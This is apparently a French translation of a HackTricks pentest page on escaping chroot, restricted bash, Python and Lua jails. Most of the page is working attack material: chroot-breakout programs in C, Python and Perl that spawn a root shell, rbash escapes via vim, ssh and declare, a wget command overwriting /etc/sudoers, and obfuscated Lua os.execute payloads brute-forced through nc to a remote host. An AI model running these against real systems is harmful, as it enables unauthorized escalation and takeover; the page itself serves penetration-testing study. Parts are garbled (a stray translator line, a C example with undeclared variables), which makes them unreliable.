# Évasion de Jails

<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **GTFOBins**

**Recherchez sur** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **si vous pouvez exécuter un binaire avec la propriété "Shell"**

## Évasions de Chroot

D'après [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations) : Le mécanisme chroot **n'est pas conçu pour se défendre** contre les manipulations intentionnelles par des **utilisateurs privilégiés** (**root**). Sur la plupart des systèmes, les contextes chroot ne s'empilent pas correctement et les programmes chrootés **avec suffisamment de privilèges peuvent effectuer un second chroot pour s'échapper**.\
Habituellement, cela signifie que pour s'échapper, vous devez être root à l'intérieur du chroot.

{% hint style="success" %}
L'**outil** [**chw00t**](https://github.com/earthquake/chw00t) a été créé pour abuser des scénarios suivants et s'échapper de `chroot`.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
Si vous êtes **root** à l'intérieur d'un chroot, vous **pouvez vous échapper** en créant **un autre chroot**. Cela parce que 2 chroots ne peuvent pas coexister (sous Linux), donc si vous créez un dossier puis **créez un nouveau chroot** sur ce nouveau dossier en étant **à l'extérieur de celui-ci**, vous serez maintenant **à l'extérieur du nouveau chroot** et donc vous serez dans le FS.

Cela se produit parce que généralement chroot NE déplace PAS votre répertoire de travail vers l'indiqué, donc vous pouvez créer un chroot mais être à l'extérieur de celui-ci.
{% endhint %}

Habituellement, vous ne trouverez pas le binaire `chroot` à l'intérieur d'une jail chroot, mais vous **pourriez compiler, télécharger et exécuter** un binaire :

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
Détails non fournis pour la traduction. Veuillez fournir le contenu spécifique à traduire.
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>

Quand on est coincé dans un shell rbash (restricted bash), Perl peut être utilisé pour échapper aux restrictions. Si Perl est installé sur le système, on peut exécuter des commandes sans les limitations de rbash.

```perl
perl -e 'exec "/bin/sh"'
```

Cette commande lance un nouveau shell sans les restrictions rbash.

</details>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Descripteur de fichier sauvegardé

{% hint style="warning" %}
Cela est similaire au cas précédent, mais dans ce cas, **l'attaquant stocke un descripteur de fichier pour le répertoire courant** et ensuite **crée le chroot dans un nouveau dossier**. Finalement, comme il a **accès** à ce **FD** **à l'extérieur** du chroot, il y accède et il **s'échappe**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
Les FD peuvent être transmis via les Unix Domain Sockets, donc :

* Créer un processus enfant (fork)
* Créer un UDS pour que le parent et l'enfant puissent communiquer
* Exécuter chroot dans le processus enfant dans un dossier différent
* Dans le proc parent, créer un FD d'un dossier qui est à l'extérieur du chroot du nouveau proc enfant
* Passer ce FD au proc enfant en utilisant l'UDS
* Le processus enfant fait chdir vers ce FD, et comme il est à l'extérieur de son chroot, il s'échappera de la prison
{% endhint %}

### &#x20;Root + Montage

{% hint style="warning" %}
* Monter le périphérique racine (/) dans un répertoire à l'intérieur du chroot
* Faire chroot dans ce répertoire

Ceci est possible sous Linux
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* Monter procfs dans un répertoire à l'intérieur du chroot (s'il ne l'est pas déjà)
* Chercher un pid qui a une entrée root/cwd différente, comme : /proc/1/root
* Faire chroot dans cette entrée
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* Créer un Fork (proc enfant) et faire chroot dans un dossier différent plus profond dans le FS et CD sur celui-ci
* Depuis le processus parent, déplacer le dossier où se trouve le processus enfant dans un dossier précédent le chroot des enfants
* Ce processus enfant se retrouvera à l'extérieur du chroot
{% endhint %}

### ptrace

{% hint style="warning" %}
* Il fut un temps où les utilisateurs pouvaient déboguer leurs propres processus à partir d'un processus d'eux-mêmes... mais cela n'est plus possible par défaut
* Cependant, si c'est possible, vous pourriez utiliser ptrace sur un processus et exécuter un shellcode à l'intérieur de celui-ci ([voir cet exemple](linux-capabilities.md#cap_sys_ptrace)).
{% endhint %}

## Bash Jails

### Énumération

Obtenir des informations sur la prison :
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Modifier PATH

Vérifiez si vous pouvez modifier la variable d'environnement PATH
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Utilisation de vim
```bash
:set shell=/bin/sh
:shell
```
### Créer un script

Vérifiez si vous pouvez créer un fichier exécutable avec _/bin/bash_ comme contenu
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Obtenir bash depuis SSH

Si vous accédez via ssh, vous pouvez utiliser cette astuce pour exécuter un shell bash :
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Déclarer
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Vous pouvez par exemple écraser le fichier sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Autres astuces

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io)\
**La page suivante pourrait également être intéressante :**

{% content-ref url="../useful-linux-commands/bypass-bash-restrictions.md" %}
[bypass-bash-restrictions.md](../useful-linux-commands/bypass-bash-restrictions.md)
{% endcontent-ref %}

## Python Jails

Astuces pour s'échapper des python jails dans la page suivante :

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua Jails

Sur cette page, vous pouvez trouver les fonctions globales auxquelles vous avez accès dans lua : [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Eval avec exécution de commande :**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Quelques astuces pour **appeler des fonctions d'une bibliothèque sans utiliser de points** :
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Enumerer les fonctions d'une bibliothèque :
```bash
for k,v in pairs(string) do print(k,v) end
```
Notez que chaque fois que vous exécutez le one-liner précédent dans un **environnement lua différent, l'ordre des fonctions change**. Par conséquent, si vous devez exécuter une fonction spécifique, vous pouvez effectuer une attaque par force brute en chargeant différents environnements lua et en appelant la première fonction de la bibliothèque :
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Obtenir un shell lua interactif** : Si vous êtes dans un shell lua limité, vous pouvez obtenir un nouveau shell lua (et, espérons-le, illimité) en appelant :
```bash
debug.debug()
```
## Références

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Diapositives : [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> !</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
